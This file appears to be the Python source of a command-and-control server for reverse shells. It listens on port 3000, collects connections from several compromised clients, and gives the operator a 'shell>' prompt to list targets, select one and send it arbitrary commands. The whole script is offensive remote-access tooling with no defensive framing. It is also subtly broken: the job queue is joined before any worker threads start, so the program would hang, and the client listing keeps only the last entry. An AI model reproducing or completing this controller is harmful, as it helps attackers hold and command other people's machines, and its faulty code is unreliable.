import socket
import sys
import threading
import time
from queue import Queue

No_Of_Threads = 2
Job_No = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Creating socket /Connect to computer/


def create_socket():
    try:
        global host
        global port
        global soc
        host = ""

        port = 3000
        soc = socket.socket()

    except socket.error as msg:
        print("Scoket Creation Error: "+str(msg))

# Binding the socket and listening for connection


def bind_socket():
    try:
        global host
        global port
        global soc

        print("Binding the Port "+str(port))
        soc.bind((host, port))
        # Listening
        soc.listen(5)
    except socket.error as msg:
        print("Scoket Binding Error: "+str(msg)+"\n"+"Retrying...")
        create_socket()


# (for single connection) Send command to client
# def send_command(connection):
#     while True:
#         command = input()
#         if command == 'quit':
#             connection.close()
#             soc.close()
#             sys.exit()

#         if len(str.encode(command)) > 0:
#             connection.send(str.encode(command))
#             client_response = str(connection.recv(1024), "utf-8")
#             print(client_response, end="")


# (For Single Client) Establish connection with a client (socket must be listening )
# def socket_accpt():
#     connection, add = soc.accept()
#     print("Connection Successfull..")
#     print("Connected to "+add[0]+"| Port "+str(add[1]))

#     send_command(connection)
#     connection.close()


# Display all current connection with the client
def list_connection():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(''))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i)+' ' + str(all_address[i][0]) + str(all_address[i][1])

    print("----Clients----"+'\n'+results)

# Selecting the target


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # Getting target id
        target = int(target)
        conn = all_connections[target]
        print("Connected to "+str(all_address[target][0]))
        print(str(all_address[target][0]+">", end=''))
        return conn

    except:
        print("Selection Invalid!!")

# Sending commands to clients


def send_target_commands(con):
    while True:
        try:
            command = input()
            if command == 'quit':
                break
            if len(str.encode(command)) > 0:
                con.send(str.encode(command))
                client_response = str(con.recv(20480), "utf-8")
                print(client_response, end="")

        except:
            print("Error in sending commands")
            break


# Handling connection from multiple clients and saving to a list
# Closing connection when server fie restarted
def accepting_connection():

    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, add = soc.accept()
            soc.setblocking(1)  # Prevents timeout

            all_connections.append(conn)
            all_address.append(add)

            print('Connection has been established : '+add[0])
        except:
            print("Error accepting connections")


# Interactive prompt for sending commands

def start_shell():
    while True:
        cmd = input('shell>')
        if cmd == 'list':
            list_connection()
        elif 'select' in cmd:
            con = get_target(cmd)
            if con is not None:
                send_target_commands(con)
        else:
            print("Command not recognized!!")
# Do next jon that is in the queue


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_shell()
        queue.task_done()


# Create No_Of_Threads


def create_thread():
    for i in range(No_Of_Threads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def create_jobs():
    for i in Job_No:
        queue.put(i)
    queue.join()


create_jobs()
create_thread()

# For single client
# def main():
#     create_socket()
#     bind_socket()
#     socket_accpt()


# main()
